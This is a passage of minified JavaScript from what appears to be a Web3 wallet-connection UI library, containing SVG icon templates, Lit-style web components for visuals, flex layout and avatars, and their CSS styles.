    d="m30.49 29.13-.49-.27-.49.27-12.77 7.1-.05.02c-.86.48-1.58.88-2.1 1.24-.54.37-1.04.81-1.28 1.45a3 3 0 0 0 0 2.12c.24.63.74 1.08 1.27 1.45.53.36 1.25.76 2.11 1.24l.05.03 6.33 3.51.17.1c2.33 1.3 3.72 2.06 5.22 2.32a9 9 0 0 0 3.08 0c1.5-.26 2.9-1.03 5.22-2.32l.18-.1 6.32-3.51.05-.03a26.9 26.9 0 0 0 2.1-1.24 3.21 3.21 0 0 0 1.28-1.45l-.94-.35.94.35a3 3 0 0 0 0-2.12l-.94.35.94-.35a3.21 3.21 0 0 0-1.27-1.45c-.53-.36-1.25-.76-2.11-1.24l-.05-.03-12.77-7.1Z"
  />
  <path
    fill="#2BEE6C"
    stroke="#fff"
    stroke-width="2"
    d="m30.49 19.13-.49-.27-.49.27-12.77 7.1-.05.02c-.86.48-1.58.88-2.1 1.24-.54.37-1.04.81-1.28 1.45a3 3 0 0 0 0 2.12c.24.63.74 1.08 1.27 1.45.53.36 1.25.76 2.11 1.24l.05.03 6.33 3.51.17.1c2.33 1.3 3.72 2.06 5.22 2.32a9 9 0 0 0 3.08 0c1.5-.26 2.9-1.03 5.22-2.32l.18-.1 6.32-3.51.05-.03a26.9 26.9 0 0 0 2.1-1.24 3.21 3.21 0 0 0 1.28-1.45l-.94-.35.94.35a3 3 0 0 0 0-2.12l-.94.35.94-.35a3.21 3.21 0 0 0-1.27-1.45c-.53-.36-1.25-.76-2.11-1.24l-.05-.03-12.77-7.1Z"
  />
  <path
    fill="#86F999"
    stroke="#fff"
    stroke-width="2"
    d="m46.69 21.06-.94-.35.94.35a3 3 0 0 0 0-2.12l-.94.35.94-.35a3.21 3.21 0 0 0-1.27-1.45c-.53-.36-1.25-.76-2.11-1.24l-.05-.03-6.32-3.51-.18-.1c-2.33-1.3-3.72-2.06-5.22-2.33a9 9 0 0 0-3.08 0c-1.5.27-2.9 1.04-5.22 2.33l-.17.1-6.33 3.51-.05.03c-.86.48-1.58.88-2.1 1.24-.54.37-1.04.81-1.28 1.45a3 3 0 0 0 0 2.12c.24.63.74 1.08 1.27 1.45.53.36 1.25.76 2.11 1.24l.05.03 6.33 3.51.17.1c2.33 1.3 3.72 2.06 5.22 2.32a9 9 0 0 0 3.08 0c1.5-.26 2.9-1.03 5.22-2.32l.18-.1 6.32-3.51.05-.03a26.9 26.9 0 0 0 2.1-1.24 3.21 3.21 0 0 0 1.28-1.45Z"
  />
  <rect width="59" height="59" x=".5" y=".5" stroke="#fff" stroke-opacity=".1" rx="2.5" />
</svg>`,fj=ze`<svg fill="none" viewBox="0 0 60 60">
  <rect width="60" height="60" fill="#C653C6" rx="3" />
  <path
    fill="#fff"
    d="M20.03 15.22C20 15.6 20 16.07 20 17v2.8c0 1.14 0 1.7-.2 2.12-.15.31-.3.5-.58.71-.37.28-1.06.42-2.43.7-.59.12-1.11.29-1.6.51a9 9 0 0 0-4.35 4.36C10 30 10 32.34 10 37c0 4.66 0 7 .84 8.8a9 9 0 0 0 4.36 4.36C17 51 19.34 51 24 51h12c4.66 0 7 0 8.8-.84a9 9 0 0 0 4.36-4.36C50 44 50 41.66 50 37c0-4.66 0-7-.84-8.8a9 9 0 0 0-4.36-4.36c-.48-.22-1-.39-1.6-.5-1.36-.29-2.05-.43-2.42-.7-.27-.22-.43-.4-.58-.72-.2-.42-.2-.98-.2-2.11V17c0-.93 0-1.4-.03-1.78a9 9 0 0 0-8.19-8.19C31.4 7 30.93 7 30 7s-1.4 0-1.78.03a9 9 0 0 0-8.19 8.19Z"
  />
  <path
    fill="#E87DE8"
    d="M22 17c0-.93 0-1.4.04-1.78a7 7 0 0 1 6.18-6.18C28.6 9 29.07 9 30 9s1.4 0 1.78.04a7 7 0 0 1 6.18 6.18c.04.39.04.85.04 1.78v4.5a1.5 1.5 0 0 1-3 0V17c0-.93 0-1.4-.08-1.78a4 4 0 0 0-3.14-3.14C31.39 12 30.93 12 30 12s-1.4 0-1.78.08a4 4 0 0 0-3.14 3.14c-.08.39-.08.85-.08 1.78v4.5a1.5 1.5 0 0 1-3 0V17Z"
  />
  <path
    fill="#E87DE8"
    fill-rule="evenodd"
    d="M12 36.62c0-4.32 0-6.48.92-8.09a7 7 0 0 1 2.61-2.61C17.14 25 19.3 25 23.62 25h6.86c.46 0 .7 0 .9.02 2.73.22 4.37 2.43 4.62 4.98.27-2.7 2.11-5 5.02-5A6.98 6.98 0 0 1 48 31.98v5.4c0 4.32 0 6.48-.92 8.09a7 7 0 0 1-2.61 2.61c-1.61.92-3.77.92-8.09.92h-5.86c-.46 0-.7 0-.9-.02-2.73-.22-4.37-2.43-4.62-4.98-.26 2.58-1.94 4.82-4.71 4.99l-.7.01c-.55 0-.82 0-1.05-.02a7 7 0 0 1-6.52-6.52c-.02-.23-.02-.5-.02-1.05v-4.79Zm21.24-.27a4 4 0 1 0-6.48 0 31.28 31.28 0 0 1 1.57 2.23c.17.4.17.81.17 1.24V42.5a1.5 1.5 0 0 0 3 0V39.82c0-.43 0-.85.17-1.24.09-.2.58-.87 1.57-2.23Z"
    clip-rule="evenodd"
  />
  <rect width="59" height="59" x=".5" y=".5" stroke="#fff" stroke-opacity=".1" rx="2.5" />
</svg>`,hj=ze`<svg fill="none" viewBox="0 0 60 60">
  <g clip-path="url(#a)">
    <path
      fill="#EB8B47"
      d="M0 24.9c0-9.25 0-13.88 1.97-17.33a15 15 0 0 1 5.6-5.6C11.02 0 15.65 0 24.9 0h10.2c9.25 0 13.88 0 17.33 1.97a15 15 0 0 1 5.6 5.6C60 11.02 60 15.65 60 24.9v10.2c0 9.25 0 13.88-1.97 17.33a15 15 0 0 1-5.6 5.6C48.98 60 44.35 60 35.1 60H24.9c-9.25 0-13.88 0-17.33-1.97a15 15 0 0 1-5.6-5.6C0 48.98 0 44.35 0 35.1V24.9Z"
    />
    <path
      stroke="#062B2B"
      stroke-opacity=".1"
      d="M.5 24.9c0-4.64 0-8.08.24-10.8.25-2.7.73-4.65 1.66-6.28A14.5 14.5 0 0 1 7.82 2.4C9.46 1.47 11.39 1 14.1.74A133 133 0 0 1 24.9.5h10.2c4.63 0 8.08 0 10.8.24 2.7.25 4.65.73 6.28 1.66a14.5 14.5 0 0 1 5.42 5.42c.93 1.63 1.41 3.57 1.66 6.28.24 2.72.24 6.16.24 10.8v10.2c0 4.63 0 8.08-.24 10.8-.25 2.7-.73 4.64-1.66 6.28a14.5 14.5 0 0 1-5.42 5.41c-1.63.94-3.57 1.42-6.28 1.67-2.72.24-6.17.24-10.8.24H24.9c-4.63 0-8.08 0-10.8-.24-2.7-.25-4.64-.73-6.28-1.67a14.5 14.5 0 0 1-5.42-5.4C1.47 50.53 1 48.6.74 45.88A133 133 0 0 1 .5 35.1V24.9Z"
    />
    <path
      fill="#FF974C"
      stroke="#fff"
      stroke-width="2"
      d="M39.2 29.2a13 13 0 1 0-18.4 0l1.3 1.28a12.82 12.82 0 0 1 2.1 2.39 6 6 0 0 1 .6 1.47c.2.76.2 1.56.2 3.17v11.24c0 1.08 0 1.61.13 2.12a4 4 0 0 0 .41.98c.26.45.64.83 1.4 1.6l.3.29c.65.65.98.98 1.36 1.09.26.07.54.07.8 0 .38-.11.7-.44 1.36-1.1l3.48-3.47c.65-.65.98-.98 1.09-1.36a1.5 1.5 0 0 0 0-.8c-.1-.38-.44-.7-1.1-1.36l-.47-.48c-.65-.65-.98-.98-1.09-1.36a1.5 1.5 0 0 1 0-.8c.1-.38.44-.7 1.1-1.36l.47-.48c.65-.65.98-.98 1.09-1.36a1.5 1.5 0 0 0 0-.8c-.1-.38-.44-.7-1.1-1.36l-.48-.5c-.65-.64-.98-.97-1.08-1.35a1.5 1.5 0 0 1 0-.79c.1-.38.42-.7 1.06-1.36l5.46-5.55Z"
    />
    <circle cx="30" cy="17" r="4" fill="#EB8B47" stroke="#fff" stroke-width="2" />
  </g>
  <defs>
    <clipPath id="a"><path fill="#fff" d="M0 0h60v60H0z" /></clipPath>
  </defs>
</svg> `,dj=ze`<svg fill="none" viewBox="0 0 60 60">
  <g clip-path="url(#a)">
    <rect width="60" height="60" fill="#00ACE6" rx="30" />
    <circle cx="64" cy="39" r="50" fill="#1AC6FF" stroke="#fff" stroke-width="2" />
    <circle cx="78" cy="30" r="50" fill="#4DD2FF" stroke="#fff" stroke-width="2" />
    <circle cx="72" cy="15" r="35" fill="#80DFFF" stroke="#fff" stroke-width="2" />
    <circle cx="34" cy="-17" r="45" stroke="#fff" stroke-width="2" />
    <circle cx="34" cy="-5" r="50" stroke="#fff" stroke-width="2" />
    <circle cx="30" cy="45" r="4" fill="#4DD2FF" stroke="#fff" stroke-width="2" />
    <circle cx="39.5" cy="27.5" r="4" fill="#80DFFF" stroke="#fff" stroke-width="2" />
    <circle cx="16" cy="24" r="4" fill="#19C6FF" stroke="#fff" stroke-width="2" />
  </g>
  <rect width="59" height="59" x=".5" y=".5" stroke="#062B2B" stroke-opacity=".1" rx="29.5" />
  <defs>
    <clipPath id="a"><rect width="60" height="60" fill="#fff" rx="30" /></clipPath>
  </defs>
</svg>`,pj=ze`<svg fill="none" viewBox="0 0 60 60">
  <g clip-path="url(#a)">
    <rect width="60" height="60" fill="#C653C6" rx="3" />
    <path
      fill="#E87DE8"
      stroke="#fff"
      stroke-width="2"
      d="M52.1 47.34c0-4.24-1.44-9.55-5.9-12.4a2.86 2.86 0 0 0-1.6-3.89v-.82c0-1.19-.52-2.26-1.35-3a4.74 4.74 0 0 0-2.4-6.26v-5.5a11.31 11.31 0 1 0-22.63 0v2.15a3.34 3.34 0 0 0-1.18 5.05 4.74 4.74 0 0 0-.68 6.44A5.22 5.22 0 0 0 14 35.92c-3.06 4.13-6.1 8.3-6.1 15.64 0 2.67.37 4.86.74 6.39a20.3 20.3 0 0 0 .73 2.39l.02.04v.01l.92-.39-.92.4.26.6h38.26l.3-.49-.87-.51.86.5.02-.01.03-.07a16.32 16.32 0 0 0 .57-1.05c.36-.72.85-1.74 1.33-2.96a25.51 25.51 0 0 0 1.94-9.07Z"
    />
    <path
      fill="#fff"
      fill-rule="evenodd"
      d="M26.5 29.5c-3-.5-5.5-3-5.5-7v-7c0-.47 0-.7.03-.9a3 3 0 0 1 2.58-2.57c.2-.03.42-.03.89-.03 2 0 2.5-2.5 2.5-2.5s0 2.5 2.5 2.5c1.4 0 2.1 0 2.65.23a3 3 0 0 1 1.62 1.62c.23.55.23 1.25.23 2.65v6c0 4-3 7-6.5 7 1.35.23 4 0 6.5-2v9.53C34 38.5 31.5 40 28 40s-6-1.5-6-2.97L24 34l2.5 1.5v-6ZM26 47h4.5c2.5 0 3 4 3 5.5h-3l-1-1.5H26v-4Zm-6.25 5.5H24V57h-8c0-1 1-4.5 3.75-4.5Z"
      clip-rule="evenodd"
    />
  </g>
  <rect width="59" height="59" x=".5" y=".5" stroke="#fff" stroke-opacity=".1" rx="2.5" />
  <defs>
    <clipPath id="a"><rect width="60" height="60" fill="#fff" rx="3" /></clipPath>
  </defs>
</svg> `,gj=ze`<svg fill="none" viewBox="0 0 60 60">
  <rect width="60" height="60" fill="#794CFF" rx="3" />
  <path
    fill="#987DE8"
    stroke="#fff"
    stroke-width="2"
    d="M33 22.5v-1H16v5H8.5V36H13v-5h3v7.5h17V31h1v7.5h17v-17H34v5h-1v-4Z"
  />
  <path fill="#fff" d="M37.5 25h10v10h-10z" />
  <path fill="#4019B2" d="M42.5 25h5v10h-5z" />
  <path fill="#fff" d="M19.5 25h10v10h-10z" />
  <path fill="#4019B2" d="M24.5 25h5v10h-5z" />
  <path fill="#fff" d="M12 30.5h4V37h-4v-6.5Z" />
  <rect width="59" height="59" x=".5" y=".5" stroke="#fff" stroke-opacity=".1" rx="2.5" />
</svg>`,vj=ze`<svg
  viewBox="0 0 60 60"
  fill="none"
>
  <g clip-path="url(#1)">
    <rect width="60" height="60" rx="30" fill="#00ACE6" />
    <path
      d="M59 73C59 89.0163 46.0163 102 30 102C13.9837 102 1 89.0163 1 73C1 56.9837 12 44 30 44C48 44 59 56.9837 59 73Z"
      fill="#1AC6FF"
      stroke="white"
      stroke-width="2"
    />
    <path
      d="M18.6904 19.9015C19.6264 15.3286 23.3466 11.8445 27.9708 11.2096C29.3231 11.024 30.6751 11.0238 32.0289 11.2096C36.6532 11.8445 40.3733 15.3286 41.3094 19.9015C41.4868 20.7681 41.6309 21.6509 41.7492 22.5271C41.8811 23.5041 41.8811 24.4944 41.7492 25.4715C41.6309 26.3476 41.4868 27.2304 41.3094 28.097C40.3733 32.6699 36.6532 36.154 32.0289 36.7889C30.6772 36.9744 29.3216 36.9743 27.9708 36.7889C23.3466 36.154 19.6264 32.6699 18.6904 28.097C18.513 27.2304 18.3689 26.3476 18.2506 25.4715C18.1186 24.4944 18.1186 23.5041 18.2506 22.5271C18.3689 21.6509 18.513 20.7681 18.6904 19.9015Z"
      fill="#1AC6FF"
      stroke="white"
      stroke-width="2"
    />
    <circle cx="24.5" cy="23.5" r="1.5" fill="white" />
    <circle cx="35.5" cy="23.5" r="1.5" fill="white" />
    <path
      d="M31 20L28 28H32"
      stroke="white"
      stroke-width="2"
      stroke-linecap="round"
      stroke-linejoin="round"
    />
  </g>
  <rect x="0.5" y="0.5" width="59" height="59" rx="29.5" stroke="white" stroke-opacity="0.1" />
  <defs>
    <clipPath id="1">
      <rect width="60" height="60" rx="30" fill="white" />
    </clipPath>
  </defs>
</svg> `,mj=ze`<svg viewBox="0 0 60 60" fill="none">
  <g clip-path="url(#1)">
    <path
      d="M0 24.9C0 15.6485 0 11.0228 1.97053 7.56812C3.3015 5.23468 5.23468 3.3015 7.56812 1.97053C11.0228 0 15.6485 0 24.9 0H35.1C44.3514 0 48.9772 0 52.4319 1.97053C54.7653 3.3015 56.6985 5.23468 58.0295 7.56812C60 11.0228 60 15.6485 60 24.9V35.1C60 44.3514 60 48.9772 58.0295 52.4319C56.6985 54.7653 54.7653 56.6985 52.4319 58.0295C48.9772 60 44.3514 60 35.1 60H24.9C15.6485 60 11.0228 60 7.56812 58.0295C5.23468 56.6985 3.3015 54.7653 1.97053 52.4319C0 48.9772 0 44.3514 0 35.1V24.9Z"
      fill="#794CFF"
    />
    <path
      d="M0.5 24.9C0.5 20.2652 0.50047 16.8221 0.744315 14.105C0.987552 11.3946 1.46987 9.45504 2.40484 7.81585C3.69145 5.56019 5.56019 3.69145 7.81585 2.40484C9.45504 1.46987 11.3946 0.987552 14.105 0.744315C16.8221 0.50047 20.2652 0.5 24.9 0.5H35.1C39.7348 0.5 43.1779 0.50047 45.895 0.744315C48.6054 0.987552 50.545 1.46987 52.1841 2.40484C54.4398 3.69145 56.3086 5.56019 57.5952 7.81585C58.5301 9.45504 59.0124 11.3946 59.2557 14.105C59.4995 16.8221 59.5 20.2652 59.5 24.9V35.1C59.5 39.7348 59.4995 43.1779 59.2557 45.895C59.0124 48.6054 58.5301 50.545 57.5952 52.1841C56.3086 54.4398 54.4398 56.3086 52.1841 57.5952C50.545 58.5301 48.6054 59.0124 45.895 59.2557C43.1779 59.4995 39.7348 59.5 35.1 59.5H24.9C20.2652 59.5 16.8221 59.4995 14.105 59.2557C11.3946 59.0124 9.45504 58.5301 7.81585 57.5952C5.56019 56.3086 3.69145 54.4398 2.40484 52.1841C1.46987 50.545 0.987552 48.6054 0.744315 45.895C0.50047 43.1779 0.5 39.7348 0.5 35.1V24.9Z"
      stroke="#062B2B"
      stroke-opacity="0.1"
    />
    <path
      d="M35.1403 31.5016C35.1193 30.9637 35.388 30.4558 35.8446 30.1707C36.1207 29.9982 36.4761 29.8473 36.7921 29.7685C37.3143 29.6382 37.8664 29.7977 38.2386 30.1864C38.8507 30.8257 39.3004 31.6836 39.8033 32.408C40.2796 33.0942 41.4695 33.2512 41.9687 32.5047C42.4839 31.7341 42.9405 30.8229 43.572 30.1399C43.9375 29.7447 44.4866 29.5756 45.0111 29.6967C45.3283 29.7701 45.6863 29.9147 45.9655 30.0823C46.4269 30.3595 46.7045 30.8626 46.6928 31.4008C46.6731 32.3083 46.3764 33.2571 46.2158 34.1473C46.061 35.0048 46.9045 35.8337 47.7592 35.664C48.6464 35.4878 49.5899 35.1747 50.497 35.1391C51.0348 35.1181 51.5427 35.3868 51.8279 35.8433C52.0004 36.1195 52.1513 36.4749 52.2301 36.7908C52.3604 37.3131 52.2009 37.8651 51.8121 38.2374C51.1729 38.8495 50.3151 39.2991 49.5908 39.8019C48.9046 40.2782 48.7473 41.4683 49.4939 41.9675C50.2644 42.4827 51.1757 42.9393 51.8587 43.5708C52.2539 43.9362 52.423 44.4854 52.3018 45.0099C52.2285 45.3271 52.0839 45.6851 51.9162 45.9642C51.6391 46.4257 51.1359 46.7032 50.5978 46.6916C49.6903 46.6719 48.7417 46.3753 47.8516 46.2146C46.9939 46.0598 46.1648 46.9035 46.3346 47.7583C46.5108 48.6454 46.8239 49.5888 46.8594 50.4958C46.8805 51.0336 46.6117 51.5415 46.1552 51.8267C45.879 51.9992 45.5236 52.15 45.2077 52.2289C44.6854 52.3592 44.1334 52.1997 43.7611 51.8109C43.1491 51.1718 42.6996 50.314 42.1968 49.5897C41.7203 48.9034 40.5301 48.7463 40.0309 49.493C39.5157 50.2634 39.0592 51.1746 38.4278 51.8574C38.0623 52.2527 37.5132 52.4218 36.9887 52.3006C36.6715 52.2273 36.3135 52.0826 36.0343 51.915C35.5729 51.6379 35.2953 51.1347 35.307 50.5966C35.3267 49.6891 35.6233 48.7405 35.7839 47.8505C35.9388 46.9928 35.0951 46.1636 34.2402 46.3334C33.3531 46.5096 32.4098 46.8227 31.5028 46.8582C30.9649 46.8793 30.457 46.6105 30.1719 46.154C29.9994 45.8778 29.8485 45.5224 29.7697 45.2065C29.6394 44.6842 29.7989 44.1322 30.1877 43.7599C30.8269 43.1479 31.6847 42.6982 32.4091 42.1954C33.0954 41.7189 33.2522 40.5289 32.5056 40.0297C31.7351 39.5145 30.824 39.058 30.1411 38.4265C29.7459 38.0611 29.5768 37.5119 29.698 36.9875C29.7713 36.6702 29.9159 36.3122 30.0836 36.0331C30.3607 35.5717 30.8638 35.2941 31.402 35.3058C32.3095 35.3255 33.2583 35.6221 34.1485 35.7828C35.006 35.9376 35.8349 35.094 35.6652 34.2393C35.489 33.3521 35.1759 32.4087 35.1403 31.5016Z"
      fill="#906EF7"
      stroke="white"
      stroke-width="2"
    />
    <path
      d="M20.7706 8.22357C20.9036 7.51411 21.5231 7 22.2449 7H23.7551C24.4769 7 25.0964 7.51411 25.2294 8.22357C25.5051 9.69403 25.4829 11.6321 27.1202 12.2606C27.3092 12.3331 27.4958 12.4105 27.6798 12.4926C29.2818 13.2072 30.6374 11.8199 31.8721 10.9752C32.4678 10.5676 33.2694 10.6421 33.7798 11.1525L34.8477 12.2204C35.3581 12.7308 35.4326 13.5323 35.025 14.128C34.1802 15.3627 32.7931 16.7183 33.5077 18.3202C33.5898 18.5043 33.6672 18.6909 33.7398 18.88C34.3683 20.5171 36.3061 20.4949 37.7764 20.7706C38.4859 20.9036 39 21.5231 39 22.2449V23.7551C39 24.4769 38.4859 25.0964 37.7764 25.2294C36.3061 25.5051 34.3685 25.483 33.7401 27.1201C33.6675 27.3093 33.59 27.4961 33.5079 27.6803C32.7934 29.282 34.1803 30.6374 35.025 31.8719C35.4326 32.4677 35.3581 33.2692 34.8477 33.7796L33.7798 34.8475C33.2694 35.3579 32.4678 35.4324 31.8721 35.0248C30.6376 34.1801 29.2823 32.7934 27.6806 33.508C27.4962 33.5903 27.3093 33.6678 27.12 33.7405C25.483 34.3688 25.5051 36.3062 25.2294 37.7764C25.0964 38.4859 24.4769 39 23.7551 39H22.2449C21.5231 39 20.9036 38.4859 20.7706 37.7764C20.4949 36.3062 20.517 34.3688 18.88 33.7405C18.6908 33.6678 18.5039 33.5903 18.3196 33.5081C16.7179 32.7936 15.3625 34.1804 14.1279 35.0251C13.5322 35.4327 12.7307 35.3582 12.2203 34.8478L11.1524 33.7799C10.642 33.2695 10.5675 32.4679 10.9751 31.8722C11.8198 30.6376 13.2067 29.2822 12.4922 27.6804C12.41 27.4962 12.3325 27.3093 12.2599 27.1201C11.6315 25.483 9.69392 25.5051 8.22357 25.2294C7.51411 25.0964 7 24.4769 7 23.7551V22.2449C7 21.5231 7.51411 20.9036 8.22357 20.7706C9.69394 20.4949 11.6317 20.5171 12.2602 18.88C12.3328 18.6909 12.4103 18.5042 12.4924 18.3201C13.207 16.7181 11.8198 15.3625 10.975 14.1278C10.5674 13.5321 10.6419 12.7305 11.1523 12.2201L12.2202 11.1522C12.7306 10.6418 13.5322 10.5673 14.1279 10.9749C15.3626 11.8197 16.7184 13.2071 18.3204 12.4925C18.5044 12.4105 18.6909 12.3331 18.8799 12.2606C20.5171 11.6321 20.4949 9.69403 20.7706 8.22357Z"
      fill="#906EF7"
      stroke="white"
      stroke-width="2"
    />
    <circle cx="23" cy="23" r="6" fill="#794CFF" stroke="white" stroke-width="2" />
    <circle cx="41" cy="41" r="4" fill="#794CFF" stroke="white" stroke-width="2" />
  </g>
  <defs>
    <clipPath id="1">
      <rect width="60" height="60" fill="white" />
    </clipPath>
  </defs>
</svg> `,bj=Qe`
  :host {
    display: block;
    width: 55px;
    height: 55px;
  }
`;var DA=globalThis&&globalThis.__decorate||function(e,t,r,n){var i,o=arguments.length,s=o<3?t:null===n?n=Object.getOwnPropertyDescriptor(t,r):n;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)s=Reflect.decorate(e,t,r,n);else for(var a=e.length-1;a>=0;a--)(i=e[a])&&(s=(o<3?i(s):o>3?i(t,r,s):i(t,r))||s);return o>3&&s&&Object.defineProperty(t,r,s),s};const wj={browser:sj,dao:oj,defi:aj,defiAlt:cj,eth:lj,layers:uj,lock:fj,login:hj,network:dj,nft:pj,noun:gj,profile:vj,system:mj};let vg=class extends $e{constructor(){super(...arguments),this.name="browser"}render(){return pe`${wj[this.name]}`}};vg.styles=[Rt,bj],DA([ve()],vg.prototype,"name",void 0),vg=DA([De("wui-visual")],vg);
/**
 * @license
 * Copyright 2018 Google LLC
 * SPDX-License-Identifier: BSD-3-Clause
 */
const qt=e=>e??sn,Mr={getSpacingStyles:(e,t)=>Array.isArray(e)?e[t]?`var(--wui-spacing-${e[t]})`:void 0:"string"==typeof e?`var(--wui-spacing-${e})`:void 0,getFormattedDate:e=>new Intl.DateTimeFormat("en-US",{month:"short",day:"numeric"}).format(e),getHostName:e=>new URL(e).hostname,getTruncateString:({string:e,charsStart:t,charsEnd:r,truncate:n})=>e.length<=t+r?e:"end"===n?`${e.substring(0,t)}...`:"start"===n?`...${e.substring(e.length-r)}`:`${e.substring(0,Math.floor(t))}...${e.substring(e.length-Math.floor(r))}`,generateAvatarColors(e){const t=e.toLowerCase().replace(/^0x/iu,"").substring(0,6),r=this.hexToRgb(t),n=[];for(let e=0;e<5;e+=1){const t=this.tintColor(r,.15*e);n.push(`rgb(${t[0]}, ${t[1]}, ${t[2]})`)}return`\n    --local-color-1: ${n[0]};\n    --local-color-2: ${n[1]};\n    --local-color-3: ${n[2]};\n    --local-color-4: ${n[3]};\n    --local-color-5: ${n[4]};\n   `},hexToRgb(e){const t=parseInt(e,16);return[t>>16&255,t>>8&255,255&t]},tintColor(e,t){const[r,n,i]=e;return[Math.round(r+(255-r)*t),Math.round(n+(255-n)*t),Math.round(i+(255-i)*t)]},isNumber:e=>/^[0-9]+$/u.test(e),getColorTheme:e=>e||(typeof window<"u"&&window.matchMedia?window.matchMedia("(prefers-color-scheme: dark)").matches?"dark":"light":"dark")},yj=Qe`
  :host {
    display: flex;
    width: inherit;
    height: inherit;
  }
`;var ls=globalThis&&globalThis.__decorate||function(e,t,r,n){var i,o=arguments.length,s=o<3?t:null===n?n=Object.getOwnPropertyDescriptor(t,r):n;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)s=Reflect.decorate(e,t,r,n);else for(var a=e.length-1;a>=0;a--)(i=e[a])&&(s=(o<3?i(s):o>3?i(t,r,s):i(t,r))||s);return o>3&&s&&Object.defineProperty(t,r,s),s};let Ei=class extends $e{render(){return this.style.cssText=`\n      flex-direction: ${this.flexDirection};\n      flex-wrap: ${this.flexWrap};\n      flex-basis: ${this.flexBasis};\n      flex-grow: ${this.flexGrow};\n      flex-shrink: ${this.flexShrink};\n      align-items: ${this.alignItems};\n      justify-content: ${this.justifyContent};\n      column-gap: ${this.columnGap&&`var(--wui-spacing-${this.columnGap})`};\n      row-gap: ${this.rowGap&&`var(--wui-spacing-${this.rowGap})`};\n      gap: ${this.gap&&`var(--wui-spacing-${this.gap})`};\n      padding-top: ${this.padding&&Mr.getSpacingStyles(this.padding,0)};\n      padding-right: ${this.padding&&Mr.getSpacingStyles(this.padding,1)};\n      padding-bottom: ${this.padding&&Mr.getSpacingStyles(this.padding,2)};\n      padding-left: ${this.padding&&Mr.getSpacingStyles(this.padding,3)};\n      margin-top: ${this.margin&&Mr.getSpacingStyles(this.margin,0)};\n      margin-right: ${this.margin&&Mr.getSpacingStyles(this.margin,1)};\n      margin-bottom: ${this.margin&&Mr.getSpacingStyles(this.margin,2)};\n      margin-left: ${this.margin&&Mr.getSpacingStyles(this.margin,3)};\n    `,pe`<slot></slot>`}};Ei.styles=[Rt,yj],ls([ve()],Ei.prototype,"flexDirection",void 0),ls([ve()],Ei.prototype,"flexWrap",void 0),ls([ve()],Ei.prototype,"flexBasis",void 0),ls([ve()],Ei.prototype,"flexGrow",void 0),ls([ve()],Ei.prototype,"flexShrink",void 0),ls([ve()],Ei.prototype,"alignItems",void 0),ls([ve()],Ei.prototype,"justifyContent",void 0),ls([ve()],Ei.prototype,"columnGap",void 0),ls([ve()],Ei.prototype,"rowGap",void 0),ls([ve()],Ei.prototype,"gap",void 0),ls([ve()],Ei.prototype,"padding",void 0),ls([ve()],Ei.prototype,"margin",void 0),Ei=ls([De("wui-flex")],Ei);const _j=Qe`
  :host {
    display: block;
    width: 64px;
    height: 64px;
    outline: 8px solid var(--wui-gray-glass-005);
    border-radius: var(--wui-border-radius-3xl);
    overflow: hidden;
    position: relative;
  }

  :host([data-variant='generated']) {
    --mixed-local-color-1: var(--local-color-1);
    --mixed-local-color-2: var(--local-color-2);
    --mixed-local-color-3: var(--local-color-3);
    --mixed-local-color-4: var(--local-color-4);
    --mixed-local-color-5: var(--local-color-5);
  }

  @supports (background: color-mix(in srgb, white 50%, black)) {
    :host([data-variant='generated']) {
      --mixed-local-color-1: color-mix(
        in srgb,
        var(--w3m-color-mix) var(--w3m-color-mix-strength),
        var(--local-color-1)
      );
      --mixed-local-color-2: color-mix(
        in srgb,
        var(--w3m-color-mix) var(--w3m-color-mix-strength),
        var(--local-color-2)
      );
      --mixed-local-color-3: color-mix(
        in srgb,
        var(--w3m-color-mix) var(--w3m-color-mix-strength),
        var(--local-color-3)
      );
      --mixed-local-color-4: color-mix(
        in srgb,
        var(--w3m-color-mix) var(--w3m-color-mix-strength),
        var(--local-color-4)
      );
      --mixed-local-color-5: color-mix(
        in srgb,
        var(--w3m-color-mix) var(--w3m-color-mix-strength),
        var(--local-color-5)
      );
    }
  }

  :host([data-variant='generated']) {
    outline: 8px solid var(--wui-avatar-border);
    background: radial-gradient(
      75.29% 75.29% at 64.96% 24.36%,
      #fff 0.52%,
      var(--mixed-local-color-5) 31.25%,
      var(--mixed-local-color-3) 51.56%,
      var(--mixed-local-color-2) 65.63%,
      var(--mixed-local-color-1) 82.29%,
      var(--mixed-local-color-4) 100%
    );
  }

  :host([data-variant='default']) {
    outline: 8px solid var(--wui-avatar-border);
    background: radial-gradient(
      75.29% 75.29% at 64.96% 24.36%,
      #fff 0.52%,
      #f5ccfc 31.25%,
      #dba4f5 51.56%,
      #9a8ee8 65.63%,
      #6493da 82.29%,
      #6ebdea 100%
    );
  }
`;var vv=globalThis&&globalThis.__decorate||function(e,t,r,n){var i,o=arguments.length,s=o<3?t:null===n?n=Object.getOwnPropertyDescriptor(t,r):n;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)s=Reflect.decorate(e,t,r,n);else for(var a=e.length-1;a>=0;a--)(i=e[a])&&(s=(o<3?i(s):o>3?i(t,r,s):i(t,r))||s);return o>3&&s&&Object.defineProperty(t,r,s),s};let Cf=class extends $e{constructor(){super(...arguments),this.imageSrc=void 0,this.alt=void 0,this.address=void 0}render(){return pe`${this.visualTemplate()}`}visualTemplate(){if(this.imageSrc)return this.dataset.variant="image",pe`<wui-image src=${this.imageSrc} alt=${this.alt??"avatar"}></wui-image>`;if(this.address){this.dataset.variant="generated";const e=Mr.generateAvatarColors(this.address);return this.style.cssText=e,null}return this.dataset.variant="default",null}};Cf.styles=[Rt,_j],vv([ve()],Cf.prototype,"imageSrc",void 0),vv([ve()],Cf.prototype,"alt",void 0),vv([ve()],Cf.prototype,"address",void 0),Cf=vv([De("wui-avatar")],Cf);const Ej=Qe`
  :host {
    display: inline-flex;
    justify-content: center;
    align-items: center;
    position: relative;
    overflow: hidden;
    background-color: var(--wui-gray-glass-020);
    border-radius: var(--local-border-radius);
    border: var(--local-border);
    width: var(--local-size);
    height: var(--local-size);
    min-height: var(--local-size);
    min-width: var(--local-size);
  }

  @supports (background: color-mix(in srgb, white 50%, black)) {
    :host {
      background-color: color-mix(in srgb, var(--local-bg-value) var(--local-bg-mix), transparent);
    }
  }
